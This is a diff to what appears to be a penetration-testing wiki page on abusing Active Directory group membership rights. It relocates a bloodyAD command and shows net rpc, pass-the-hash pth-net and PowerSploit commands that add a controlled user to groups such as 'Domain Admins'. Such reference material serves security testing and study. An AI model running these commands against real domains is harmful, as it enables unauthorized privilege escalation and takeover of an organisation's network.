@@ -16,6 +16,12 @@ net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%$Passwo
 # With Pass-the-Hash
 pth-net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController
 ```
+
+Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember $TargetGroup $TargetUser
+```
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -30,13 +36,6 @@ Add-ADGroupMember -Identity 'Domain Admins' -Members 'user'
 
 # Powershell: PowerSploit module
 Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'
-```
-{% endtab %}
-
-{% tab title="Windows/UNIX-like" %}
-It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
-```bash
-bloodyAD --host $DomainController -d $DOMAIN -u $ControlledUser -p $Password add groupMember $TargetGroup $TargetUser
 ```
 {% endtab %}
 
